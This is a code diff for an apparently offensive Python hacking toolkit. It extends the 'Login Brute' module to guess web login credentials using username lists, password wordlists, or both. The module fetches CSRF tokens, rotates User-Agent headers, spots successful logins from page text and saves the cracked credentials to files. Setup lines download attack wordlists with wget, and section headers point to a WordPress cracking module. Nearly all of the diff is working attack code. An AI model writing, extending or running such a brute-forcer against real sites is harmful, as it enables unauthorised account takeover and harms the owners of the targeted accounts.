@@ -93,17 +93,8 @@ if not os.path.exists("./src/error_sql.txt"):
 if not os.path.exists("./src/UserAgent.txt"):
     os.system("wget -O ./src/UserAgent.txt https://raw.githubusercontent.com/SansXpl/src/main/UserAgent.txt")
 
-if not os.path.exists("./src/brute"):
-    os.makedirs("./src/brute")
-
-if not os.path.exists("./src/brute/incorrectMessage.txt"):
-    os.system("wget -O ./src/brute/incorrectMessage.txt https://raw.githubusercontent.com/SansXpl/src/main/incorrectMessage.txt")
-
-if not os.path.exists("./src/brute/successMessage.txt"):
-    os.system("wget -O ./src/brute/successMessage.txt https://raw.githubusercontent.com/SansXpl/src/main/successMessage.txt")
-
-if not os.path.exists("./src/brute/users.txt"):
-    os.system("wget -O ./src/brute/users.txt https://raw.githubusercontent.com/SansXpl/src/main/users.txt")
+if not os.path.exists("./src/users.txt"):
+    os.system("wget -O ./src/users.txt https://raw.githubusercontent.com/SansXpl/src/main/users.txt")
 
 if not os.path.exists("./src/passwords.txt"):
     os.system("wget -O ./src/passwords.txt https://raw.githubusercontent.com/SansXpl/src/main/passwords.txt")
@@ -1577,7 +1568,7 @@ class ADMF():
 #Login Brute =====================================
 class LOG():
 
-def get_csrf_token(url, csrf_field):
+  def get_csrf_token(url, csrf_field):
     time_stamp = time.time()
     date_time = datetime.fromtimestamp(time_stamp)
     str_date_time = date_time.strftime("%H:%M:%S")
@@ -1598,6 +1589,9 @@ def get_csrf_token(url, csrf_field):
     try:
       csrf = 0
       _csrf = 0
+      bfmode = 0
+      usrmode = 0
+      passmode = 0
       os.system(clrcmd)
       print(banner)
       print(f"{W}[{BR}@{W}]{BG} Login Brute{W}")
@@ -1616,15 +1610,26 @@ def get_csrf_token(url, csrf_field):
       print(f"{W}[{BR}@{W}]{BG} Login Brute{W}")
       print(f"{W} ├─[{BO}Target{W}] {P}{target}")
       user = str(input(f"{W} ├─[{BO}Username{W}]{PINK} "))
+      if os.path.isfile(user) and os.access(user, os.R_OK):
+        user = user
+        bfmode = 1
+        usrmode = 1
+      else:
+        user = user
+
       passwd = str(input(f"{W} ├─[{BO}Wordlist [leave blank for default]{W}]{PINK} "))
       if passwd == "" or passwd == " ":
         passwd = "./src/passwords.txt"
+        bfmode = 2
+        passmode = 1
       else:
-        if not os.path.isfile(passwd) and not os.access(passwd, os.R_OK):
-          input(f"{error}{BR} File Does Not Exists!")
-          self.main()
+        if os.path.isfile(passwd) and os.access(passwd, os.R_OK):
+          passwd = passwd
+          bfmode = 2
+          passmode = 1
         else:
           passwd = passwd
+
       user_field = str(input(f"{W} ├─[{BO}User Field{W}]{BB} "))
         
 
@@ -1636,7 +1641,21 @@ def get_csrf_token(url, csrf_field):
         password_field = str(input(f"{W} └─[{BO}Pass Field{W}]{BB} "))
         csrf_field = str("None")
 
-      self.run(target, user, passwd, user_field, password_field, csrf_field, csrf)
+      if usrmode == 1 and passmode == 1:
+        bfmode = 3
+
+        #input("Mode 1 & 2, Username & Password List")
+      '''elif bfmode == 1:
+        input("Mode 1, Username List, password normal")
+      elif bfmode == 2:
+        input("Mode 2, Username Normal, password list")
+      else:
+        input("Mode 0, Username & Password normal")
+        pass'''
+
+
+
+      self.run(target, user, passwd, user_field, password_field, csrf_field, csrf, bfmode)
 
     except KeyboardInterrupt:
       cancel()
@@ -1648,23 +1667,50 @@ def get_csrf_token(url, csrf_field):
         yield b
 
 
-  def run(self, url, user, passwd, user_field, password_field, csrf_field, csrf):
+  def run(self, url, user, passwd, user_field, password_field, csrf_field, csrf, bfmode):
     n_url = urlparse(url).hostname
+    totaluser = 1
+    totalwordlist = 1
+    filetemp = str(uuid.uuid4())
 
     if csrf == 1:
       _csrf_token = O+csrf_field
     else:
       _csrf_token = W+csrf_field
 
-    passwd_size = os.path.getsize(passwd) >>20
-    if passwd_size < 100:
-      with open(passwd) as f:
-        totalwordlist = sum(bl.count("\n") for bl in self.blocks(f))
-    else:
-        totalwordlist="unknown"
+    if bfmode == 1:
+      user_size = os.path.getsize(user) >>20
+      if user_size < 100:
+        with open(user) as f:
+          totaluser = sum(bl.count("\n") for bl in self.blocks(f))
+      else:
+          totaluser="unknown"
+
+    elif bfmode == 2:
+      passwd_size = os.path.getsize(passwd) >>20
+      if passwd_size < 100:
+        with open(passwd) as f:
+          totalwordlist = sum(bl.count("\n") for bl in self.blocks(f))
+      else:
+          totalwordlist="unknown"
+
+    elif bfmode == 3:
+      user_size = os.path.getsize(user) >>20
+      if user_size < 100:
+        with open(user) as f:
+          totaluser = sum(bl.count("\n") for bl in self.blocks(f))
+      else:
+          totaluser="unknown"
+
+      passwd_size = os.path.getsize(passwd) >>20
+      if passwd_size < 100:
+        with open(passwd) as f:
+          totalwordlist = sum(bl.count("\n") for bl in self.blocks(f))
+      else:
+          totalwordlist="unknown"
 
     print(f"\n{success}{BB} Target.......: {P}{url}")
-    print(f"{success}{BB} Username.....: {PINK}{user}")
+    print(f"{success}{BB} Username.....: {PINK}{str(totaluser)}{PINK} [{user}]")
     print(f"{success}{BB} Wordlist.....: {BO}{str(totalwordlist)}{PINK} [{passwd}]")
     print(f"{success}{BB} User Field...: {O}{user_field}")
     print(f"{success}{BB} Pass Field...: {O}{password_field}")
@@ -1672,66 +1718,271 @@ def get_csrf_token(url, csrf_field):
 
     checkConnection(url,1)
 
-    count = 0
-    totalwordlist = str(totalwordlist)
-    term = Terminal()
-
     listAgent= open("./src/UserAgent.txt", "r")
     Agent = listAgent.read().splitlines()
     Ua = random.choice(Agent)
     header = {'User-Agent': Ua}
 
-    with open(passwd) as wordlist:
-        for pwd in wordlist:
-          count += 1
-          cnt = W+"["+BO+str(count)+'/'+totalwordlist+W+"]"
+    count = 1
+    count1 = 1
+    count2 = 1
+    usrcnt = 0
+    no = usrcnt + 1
+    totalwordlist = str(totalwordlist)
+    totaluser = str(totaluser)
+    term = Terminal()
+    print("\n")
 
-          if csrf == 1:
-            payload = {user_field: user,password_field: pwd.replace('\n', ''),csrf_field: self.get_csrf_token(url, csrf_field)}
+    if bfmode == 1:
+      with open(user) as usrlist:
+        try:
+          for usr in usrlist:
+            cnt = W+"["+BO+str(count)+'/'+totaluser+W+"]"
+
+            if csrf == 1:
+              payload = {user_field: usr.replace('\n', ''),password_field: passwd,csrf_field: self.get_csrf_token(url, csrf_field)}
+
+            else:
+              payload = {user_field: usr.replace('\n', ''),password_field: passwd}
+
+            progress = BO+" User: "+P+usr.replace('\n', '')+BO+" Pass: "+P+passwd
+            save = str(no)+" | "+url+" | "+usr.replace('\n', '')+" | "+passwd
+
+            req = requests.post(url, data=payload, headers=header)
+
+            if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
+              usrcnt += 1
+              no += 1
+              text = f"{save}\n"
+              temp = open("./.temp/" + filetemp, "a+")
+              temp.writelines(text)
+              temp.close()
+              with term.location(x=0, y=26):
+                print(whitespace)
+              with term.location(x=0, y=26):
+                print(f"{success}{BB} Payload: {W}{payload}")
+              print(f"{whitespace}", end='\r')
+              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}", end='\r')
+              break
+              
+            else:
+              with term.location(x=0, y=26):
+                print(whitespace)
+              with term.location(x=0, y=26):
+                print(f"{success}{BB} Payload: {W}{payload}")
+              print(f"{whitespace}", end='\r')
+              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}", end='\r')
+
+            sleep(0.010)
+            count += 1
+        
+        except KeyboardInterrupt:
+          pause = str(input(f"\n\n{systm}{BB} [C = Continue] [X = Stop] {BO}Default is Continue [C/X?]"))
+            
+          if pause == "X" or pause == "x":
+            if os.path.exists("./.temp/" + filetemp):
+              c = open("./.temp/" + filetemp, "r")
+              name = "./output/logbrute/" + n_url + ".txt"
+              content = c.read()
+              c.close()
+              os.remove("./.temp/" + filetemp)
+              save_file(name, content, 1)
+              main()
+
+            else:
+              if usrcnt > 0:
+                content = f"{save}\n"
+                name = "./output/logbrute/" + n_url + ".txt"
+                save_file(name, content, 1)
+                main()
+              else:
+                input(f"\n{fail}{BO} Nothing is Saved!")
+                main()
 
           else:
-            payload = {user_field: user,password_field: pwd.replace('\n', '')}
+            text =f"{save}\n"
+            temp = open("./.temp/" + filetemp, "a+")
+            temp.writelines(text)
+            temp.close()
 
-          req = requests.post(url, data=payload, headers=header)
+      if os.path.exists("./.temp/" + filetemp):
+        c = open("./.temp/" + filetemp, "r")
+        name = "./output/logbrute/" + n_url + ".txt"
+        content = c.read()
+        c.close()
+        os.remove("./.temp/" + filetemp)
+        save_file(name, content, 1)
+        main()
 
-          if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
-            with term.location(x=0, y=26):
-                print(whitespace)
-            with term.location(x=0, y=28):
-                print(whitespace)
-            print(f"\n{found}{BG} Login User Found!{BO}\nUrl: {P}{url}{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{pwd}")
-
-            content = f"Url: {url}\nUsername: {user}\nPassword: {pwd}\n"
-            name = "./output/logbrute/" + n_url + ".txt"
-            save_file(name, content, 1)
-            main()
-            break
-
-          else:
-            with term.location(x=0, y=26):
-              try:
-                with term.location(x=0, y=26):
-                  print(whitespace)
-                with term.location(x=0, y=26):
-                  print(f"{success}{BB}Payload: {W}{payload}")
-                with term.location(x=0, y=28):
-                  print(whitespace)
-                with term.location(x=0, y=28):
-                  print(f"{cnt}{BO} User: {P}{user}{BO} Pass: {P}{pwd}")
-              except KeyboardInterrupt:   
-                with term.location(x=0, y=30):
-                  cancel()
-
-
-          sleep(0.150)
-          count = int(count)
-
-    with term.location(x=0, y=28):
-      print(whitespace)
-    with term.location(x=0, y=28):
-      print(f"\n{error}{BR} Password NOT found :(")
-      input("")
+      input(f"\n{error}{BR} Username Not Found!")
       main()
+
+
+    elif bfmode == 2:
+      with open(passwd) as wordlist:
+          try:
+              for pwd in wordlist:
+                cnt = W+"["+BO+str(count)+'/'+totalwordlist+W+"]"
+
+                if csrf == 1:
+                  payload = {user_field: user,password_field: pwd.replace('\n', ''),csrf_field: self.get_csrf_token(url, csrf_field)}
+
+                else:
+                  payload = {user_field: user,password_field: pwd.replace('\n', '')}
+
+                progress = BO+" User: "+P+user+BO+" Pass: "+P+pwd.replace('\n', '')
+                save = str(no)+" | "+url+" | "+user+" | "+pwd.replace('\n', '')
+
+                req = requests.post(url, data=payload, headers=header)
+
+                if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
+                  usrcnt += 1
+                  no += 1
+                  text = f"{save}\n"
+                  temp = open("./.temp/" + filetemp, "a+")
+                  temp.writelines(text)
+                  temp.close()
+                  with term.location(x=0, y=26):
+                    print(whitespace)
+                  with term.location(x=0, y=26):
+                    print(f"{success}{BB} Payload: {W}{payload}")
+                  print(f"{whitespace}", end='\r')
+                  print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}", end='\r')
+                  break
+
+                else:
+                  with term.location(x=0, y=26):
+                    print(whitespace)
+                  with term.location(x=0, y=26):
+                    print(f"{success}{BB} Payload: {W}{payload}")
+                  print(f"{whitespace}", end='\r')
+                  print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}", end='\r')
+
+                sleep(0.010)
+                count += 1
+        
+          except KeyboardInterrupt:
+              cancel()
+
+      if os.path.exists("./.temp/" + filetemp):
+        c = open("./.temp/" + filetemp, "r")
+        name = "./output/logbrute/" + n_url + ".txt"
+        content = c.read()
+        c.close()
+        os.remove("./.temp/" + filetemp)
+        save_file(name, content, 1)
+        main()
+
+      input(f"\n{error}{BR} Password Not Found!")
+      main()
+    
+    elif bfmode == 3:
+      with open(user) as usrlist:
+        for usr in usrlist:
+          count2 = 0
+          with open(passwd) as wordlist:
+            try:
+              for pwd in wordlist:
+                cnt = W+"["+BO+str(count1)+'/'+totaluser+W+"]["+BO+str(count2)+'/'+totalwordlist+W+"]"
+
+                if csrf == 1:
+                  payload = {user_field: usr.replace('\n', ''),password_field: pwd.replace('\n', ''),csrf_field: self.get_csrf_token(url, csrf_field)}
+
+                else:
+                  payload = {user_field: usr.replace('\n', ''),password_field: pwd.replace('\n', '')}
+
+                progress = BO+" User: "+P+usr.replace('\n', '')+BO+" Pass: "+P+pwd.replace('\n', '')
+                save = str(no)+" | "+url+" | "+usr.replace('\n', '')+" | "+pwd.replace('\n', '')
+
+                req = requests.post(url, data=payload, headers=header)
+
+                if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
+                  usrcnt += 1
+                  no += 1
+                  text = f"{save}\n"
+                  temp = open("./.temp/" + filetemp, "a+")
+                  temp.writelines(text)
+                  temp.close()
+                  break
+
+                else:
+                  with term.location(x=0, y=26):
+                    print(whitespace)
+                  with term.location(x=0, y=26):
+                    print(f"{success}{BB} Payload: {W}{payload}")
+                  print(f"{whitespace}", end='\r')
+                  print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}", end='\r')
+
+                sleep(0.010)
+                count2 += 1
+        
+            except KeyboardInterrupt:
+              pause = str(input(f"\n\n{systm}{BB} [C = Continue] [X = Stop] {BO}Default is Continue [C/X?]"))
+            
+              if pause == "X" or pause == "x":
+                if os.path.exists("./.temp/" + filetemp):
+                  c = open("./.temp/" + filetemp, "r")
+                  name = "./output/logbrute/" + n_url + ".txt"
+                  content = c.read()
+                  c.close()
+                  os.remove("./.temp/" + filetemp)
+                  save_file(name, content, 1)
+                  main()
+
+                else:
+                  if usrcnt > 0:
+                    content = f"{save}\n"
+                    name = "./output/logbrute/" + n_url + ".txt"
+                    save_file(name, content, 1)
+                    main()
+                  else:
+                    input(f"\n{fail}{BO} Nothing is Saved!")
+                    main()
+
+              else:
+                text =f"{save}\n"
+                temp = open("./.temp/" + filetemp, "a+")
+                temp.writelines(text)
+                temp.close()
+          count1 += 1
+
+      if os.path.exists("./.temp/" + filetemp):
+        c = open("./.temp/" + filetemp, "r")
+        name = "./output/logbrute/" + n_url + ".txt"
+        content = c.read()
+        c.close()
+        os.remove("./.temp/" + filetemp)
+        save_file(name, content, 1)
+        main()
+
+      input(f"\n{error}{BR} Username & Password Not Found!")
+      main()
+    
+    else:
+      if csrf == 1:
+        payload = {user_field: user,password_field: passwd,csrf_field: self.get_csrf_token(url, csrf_field)}
+
+      else:
+        payload = {user_field: user,password_field: passwd}
+
+      req = requests.post(url, data=payload, headers=header)
+      if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
+          print(f"\n{found}{BG} Login User Found!{BO}\nUrl: {P}{url}{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{passwd}")
+
+          content = f"{url} | {user} | {passwd}\n"
+          name = "./output/logbrute/" + n_url + ".txt"
+          save_file(name, content, 1)
+          main()
+
+      else:
+          with term.location(x=0, y=26):
+            print(whitespace)
+          with term.location(x=0, y=26):
+            print(f"{success}{BB}Payload: {W}{payload}")
+          print(f"{printout}{BO} User: {P}{user}{BO} Pass: {P}{passwd}")
+      input(f"\n{error}{BR} Login Incorrect!")
+      main()
+
 #MARKER #WordPress Crack =====================================
 class WP():
 
